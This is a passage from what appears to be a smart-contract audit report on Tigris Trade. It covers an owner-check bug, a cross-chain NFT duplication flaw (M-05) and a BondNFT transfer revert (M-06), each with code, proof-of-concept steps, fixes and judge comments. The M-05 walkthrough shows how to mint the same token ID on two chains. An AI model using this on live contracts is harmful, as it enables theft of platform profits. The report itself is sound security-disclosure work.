{</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        if (position.ownerOf(_id) != _trader) revert(&quot;2&quot;); //NotPositionOwner   </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<p>As you can see this function doesn’t allow approved operators of token’s owner to pass the check. As a resul, functions are not possible to call for them on behalf of owner.</p>\n<p>For example <a href=\"https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L235\">here</a>, there is a check that doesn’t allow to call initiateCloseOrder function.</p>\n<h3 id=\"tools-used-8\" style=\"position:relative;\"><a href=\"#tools-used-8\" aria-label=\"tools used 8 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VS Code</p>\n<h3 id=\"recommended-mitigation-steps-14\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-14\" aria-label=\"recommended mitigation steps 14 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Allow operators of token’s owner to call functions on behalf of owner.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/124#issuecomment-1385166664\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>The warden has shown how, due to an inconsistency between the check and the permissions, some functions will not work for an approved operator.</p>\n<p>Because some functions will, and the system seems to be written with the intention of allowing that functionality, I believe Medium Severity to be the most appropriate.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/124#issuecomment-1400571072\">GainsGoblin (Tigris Trade) acknowledged and commented</a>:</strong></p>\n<blockquote>\n<p>@Alex the Entreprenerd We want to keep <code>_checkOwner()</code> the way it is currently implemented. For approving another address for trading on behalf of the user’s address, we have the <code>approveProxy()</code> function.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-05-failure-in-endpoint-can-cause-minting-more-than-one-nft-with-the-same-token-id-in-different-chains\" style=\"position:relative;\"><a href=\"#m-05-failure-in-endpoint-can-cause-minting-more-than-one-nft-with-the-same-token-id-in-different-chains\" aria-label=\"m 05 failure in endpoint can cause minting more than one nft with the same token id in different chains permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/150\">[M-05] Failure in <code>endpoint</code> can cause minting more than one NFT with the same token id in different chains</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/150\">HE1M</a></em></p>\n<p>In the contract <code>GovNFT</code>, it is possible to bridge the governance NFT to other chains. It is also stated in the document that:</p>\n<blockquote>\n<p>NFT holders only earn the profits generated by the platform on the chain that the NFT is on.</p>\n</blockquote>\n<p>It is assumed that there is only one unique NFT per token id. But there is a scenario that can lead to more than one NFT with the same token id on different chains.</p>\n<h3 id=\"proof-of-concept-15\" style=\"position:relative;\"><a href=\"#proof-of-concept-15\" aria-label=\"proof of concept 15 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<ul>\n<li>Suppose Bob (honest user who owns an NFT with token id X on chain B) plans to bridge this NFT from chain B to chain A. So, Bob calls the function <code>crossChain</code> to bridge the NFT from chain B to chain A. Thus, his NFT will be burnt on chain B, and it is supposed to be minted on chain A.</li>\n</ul>\n<p><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/GovNFT.sol#L124\">https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/GovNFT.sol#L124</a></p>\n<ul>\n<li>The <code>endpoint</code> is responsible for completing  the bridging task on chain A.</li>\n<li>Suppose the <code>endpoint</code> calls the function <code>lzReceive</code> with low gas on chain A, so that the transaction will be not successful.</li>\n</ul>\n<!---->\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"36\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">function lzReceive(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint16 _srcChainId,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        bytes memory _srcAddress,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint64 _nonce,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        bytes memory _payload</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ) external override {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        require(_msgSender() == address(endpoint), &quot;!Endpoint&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        (bool success, bytes memory reason) = address(this).excessivelySafeCall(gasleft()*4/5, 150, abi.encodeWithSelector(this.nonblockingLzReceive.selector, _srcChainId, _srcAddress, _nonce, _payload));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // try-catch all errors/exceptions</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        if (!success) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            failedMessages[_srcChainId][_srcAddress][_nonce] = keccak256(_payload);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            emit MessageFailed(_srcChainId, _srcAddress, _nonce, _payload, reason);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/GovNFT.sol#L168\">https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/GovNFT.sol#L168</a></p>\n<ul>\n<li>Since the transaction was not successful, the message will be added as a failed message.</li>\n</ul>\n<!---->\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"37\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">failedMessages[chainB][Bob&#39;s address][_nonce] = keccak256(_payload);</span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/GovNFT.sol#L178\">https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/GovNFT.sol#L178</a></p>\n<ul>\n<li>Then, due to network lag (or any server issue, or any failure in <code>endpoint</code>), the <code>endpoint</code> assumes that the transaction is not sent, and it again calls this function with enough gas, so, the NFT with token id X will be minted to Bob’s address on chain A. The flow is as follows:</li>\n</ul>\n<p><code>lzReceive</code> ==> <code>nonblockingLzReceive</code> ==> <code>_nonblockingLzReceive</code> ==> <code>_bridgeMint</code></p>\n<ul>\n<li>Now Bob has the NFT on chain A. Moreover, he has a failed message on chain A.</li>\n<li>Then Bob calls the function <code>crossChain</code> to bridge that NFT from chain A to chain B. So, this NFT will be burnt on chain A, and minted to Bob’s address on chain B.</li>\n<li>Now, Bob has the NFT with token id X on chain B. Moreover, he has a failed message on chain A.</li>\n<li>He calls the function <code>retryMessage</code> to retry the failed message on chain A.</li>\n</ul>\n<p><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/GovNFT.sol#L206\">https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/GovNFT.sol#L206</a></p>\n<ul>\n<li>By doing so the NFT with token id X will be minted to Bob on chain A. The flow is as follows:</li>\n</ul>\n<p><code>retryMessage</code> ==> <code>_nonblockingLzReceive</code> ==> <code>_bridgeMint</code></p>\n<ul>\n<li>Now Bob has the NFT with token id X on both chain A and chain B. This is the vulnerability.</li>\n<li>Now he can, for example, sell the NFT on chain B while he is earning the profits generated by the platform on the chain A that the NFT is on.</li>\n<li>Please note that Bob can not call the function <code>retryMessage</code> while he owns the NFT on chain A. Because during minting the NFT, it checks whether the token id exists or not. That is why Bob first bridges the NFT to another chain, and then retries the failed message.</li>\n</ul>\n<p><strong><em>The vulnerability is that when the message is failed, it is not considered as consumed, so in case of a failure in <code>endpoint</code> it is possible to have failed messages and be able to mint it at the same time.</em></strong></p>\n<p>Please note that if this scenario happens again, more NFTs with the same token id X will be minted to Bob on different chains.</p>\n<h3 id=\"recommended-mitigation-steps-15\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-15\" aria-label=\"recommended mitigation steps 15 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>It is recommended to track the consumed messages, and add a consumed flag whenever the function <code>lzReceive</code> is called, because it will either immediately mint the NFT or add it to the failed messages to be minted later.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"38\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">mapping(uint16 =&gt; mapping(bytes =&gt; mapping(uint64 =&gt; bool))) public consumedMessage;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    function lzReceive(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint16 _srcChainId,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        bytes memory _srcAddress,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint64 _nonce,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        bytes memory _payload</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ) external override {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        require(!consumedMessage[_srcChainId][_srcAddress][_nonce], &quot;already consumed&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        consumedMessage[_srcChainId][_srcAddress][_nonce] = true;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        require(_msgSender() == address(endpoint), &quot;!Endpoint&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        (bool success, bytes memory reason) = address(this).excessivelySafeCall(gasleft()*4/5, 150, abi.encodeWithSelector(this.nonblockingLzReceive.selector, _srcChainId, _srcAddress, _nonce, _payload));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // try-catch all errors/exceptions</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        if (!success) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            failedMessages[_srcChainId][_srcAddress][_nonce] = keccak256(_payload);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            emit MessageFailed(_srcChainId, _srcAddress, _nonce, _payload, reason);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/150\">GainsGoblin (Tigris Trade) confirmed</a></strong> </p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/150#issuecomment-1387181367\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>The Warden has shown a flaw in the FSM in <code>lzReceive</code> that, due to an unexpected revert, could cause the ability to have the same tokenId on multiple chains.</p>\n<p>Because of it’s reliance on external conditions, I agree with Medium Severity.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/150#issuecomment-1407486546\">GainsGoblin (Tigris Trade) resolved</a>:</strong></p>\n<blockquote>\n<p>Mitigation: <a href=\"https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419174114\">https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419174114</a> </p>\n<p>This implementation of consumedMessage check returns instead of reverts. We don’t want it to revert because that would cause the message queue to be blocked.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-06-bondnfts-can-revert-when-transferred\" style=\"position:relative;\"><a href=\"#m-06-bondnfts-can-revert-when-transferred\" aria-label=\"m 06 bondnfts can revert when transferred permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/162\">[M-06] BondNFTs can revert when transferred</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/162\">0xdeadbeef0x</a></em></p>\n<p><code>BondNFT</code>s should be transferrable. According the the proposal and the sponsor, <code>BondNFT</code>s should could be sold and borrowed against.</p>\n<p>The proposal for context: <a href=\"https://gov.tigris.trade/#/proposal/0x2f2d1d63060a4a2f2718ebf86250056d40380dc7162fb4bf5e5c0b5bee49a6f3\">https://gov.tigris.trade/#/proposal/0x2f2d1d63060a4a2f2718ebf86250056d40380dc7162fb4bf5e5c0b5bee49a6f3</a></p>\n<p>The current implementation limits selling/depositing to only the same day that rewards are distributed for the <code>tigAsset</code> of the bond.</p>\n<p>The impact if no rewards are distributed in the same day:</p>\n<ol>\n<li><code>BondNFT</code>s listed on open markets will not be able to fulfill the orders</li>\n<li><code>BondNFT</code>s deposited as collateral will not be able to release the collateral</li>\n</ol>\n<p>Because other market/platforms used for selling/depositing will not call <code>claimGovFees</code> to distribute rewards, they will revert when trying to transfer the <code>BondNFT</code>.</p>\n<p>Realistic examples could be <code>BondNFT</code>s listed on OpenSea.</p>\n<p>Example of reasons why rewards would not be distributed in the same day:</p>\n<ol>\n<li>Low activity from investors, rewards are distributed when users lock/release/extend</li>\n<li><code>tigAsset</code> is blacklisted in <code>BondNFT</code>, rewards will not be distributed in such case.</li>\n</ol>\n<h3 id=\"proof-of-concept-16\" style=\"position:relative;\"><a href=\"#proof-of-concept-16\" aria-label=\"proof of concept 16 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><code>BondNFT</code> has a mechanism to update the time <code>tigAsset</code> rewards are distributed. It uses a map that points to the last timestamp rewards were distributed for <code>epoch[tigAsset]</code>.</p>\n<p><code>distribute</code> function in <code>BondNFT</code>: <br><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/BondNFT.sol#L221\">https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/BondNFT.sol#L221</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"39\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    function distribute(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address _tigAsset,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint _amount</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ) external {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        if (totalShares[_tigAsset] == 0 || !allowedAsset[_tigAsset]) return;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        IERC20(_tigAsset).transferFrom(_msgSender(), address(this), _amount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        unchecked {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            uint aEpoch = block.timestamp / DAY;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            if (aEpoch &gt; epoch[_tigAsset]) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                for (uint i=epoch[_tigAsset]; i&lt;aEpoch; i++) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                    epoch[_tigAsset] += 1;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                    accRewardsPerShare[_tigAsset][i+1] = accRewardsPerShare[_tigAsset][i];</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            accRewardsPerShare[_tigAsset][aEpoch] += _amount * 1e18 / totalShares[_tigAsset];</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        emit Distribution(_tigAsset, _amount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<p>(Please note that if the asset is blacklisted through <code>allowedAsset</code>, the  <code>epoch[tigAsset]</code> will not be updated)</p>\n<p>When <code>BondNFT</code>s are transferred, a check is implemented to make sure <code>epoch[tigAsset]</code> is updated to the current day.</p>\n<p>According to the sponsor, the reason for this check is to make sure that a bond that should be expired doesn’t get transferred while the epoch hasn’t yet been updated.</p>\n<p><code>_transfer</code> function in <code>BondNFT</code>:\n<a href=\"https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/BondNFT.sol#L329\">https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/BondNFT.sol#L329</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"40\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    function _transfer(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address from,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address to,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 _id</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ) internal override {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        Bond memory bond = idToBond(_id);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        require(epoch[bond.asset] == block.timestamp/DAY, &quot;Bad epoch&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        require(!bond.expired, &quot;Expired!&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        unchecked {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            require(block.timestamp &gt; bond.mintTime + 300, &quot;Recent update&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            userDebt[from][bond.asset] += bond.pending;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            bondPaid[_id][bond.asset] += bond.pending;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        super._transfer(from, to, _id);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<p>As can be seen above, if <code>epoch[tigAsset]</code> is not set to the same day of the transfer, the transfer will fail and the impacts in the impact section will happen.</p>\n<h3 id=\"hardhat-poc\" style=\"position:relative;\"><a href=\"#hardhat-poc\" aria-label=\"hardhat poc permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Hardhat POC</h3>\n<p>There is already an implemented test showing that transfers fail when <code>epoch[tigAsset]</code> is not updated: </p>\n<p><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/test/09.Bonds.js#L472\">https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/test/09.Bonds.js#L472</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"41\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    it(&quot;Bond can only transferred if epoch is updated&quot;, async function () {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      await stabletoken.connect(owner).mintFor(owner.address, ethers.utils.parseEther(&quot;3000&quot;));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      await lock.connect(owner).lock(StableToken.address, ethers.utils.parseEther(&quot;3000&quot;), 365);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      await network.provider.send(&quot;evm_increaseTime&quot;, [864000]);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      await network.provider.send(&quot;evm_mine&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      await expect(bond.connect(owner).safeTransferMany(user.address, [1])).to.be.revertedWith(&quot;Bad epoch&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    });</span></span></code></pre>\n<h3 id=\"tools-used-9\" style=\"position:relative;\"><a href=\"#tools-used-9\" aria-label=\"tools used 9 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VS Code, Hardhat</p>\n<h3 id=\"recommended-mitigation-steps-16\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-16\" aria-label=\"recommended mitigation steps 16 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>The reason for the check is to validate that a bond.expired updated according to the actual timestamp.</p>\n<p>Instead of having</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"42\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">        require(epoch[bond.asset] == block.timestamp/DAY, &quot;Bad epoch&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        require(!bond.expired, &quot;Expired!&quot;);</span></span></code></pre>\n<p>You could replace it with:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"43\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"> require(bond.expireEpoch  &gt;= block.timestamp/DAY, &quot;Transfer after expired not allowed&quot;);</span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/162\">TriHaz (Tigris Trade) confirmed</a></strong> </p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/162#issuecomment-1383893616\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>The warden has shown a way for the BondNFT to not be transferable, because this shows a functionality loss, given a specific circumstance, I agree with Medium Severity.</p>\n</blockquote>\n<p><strong><a 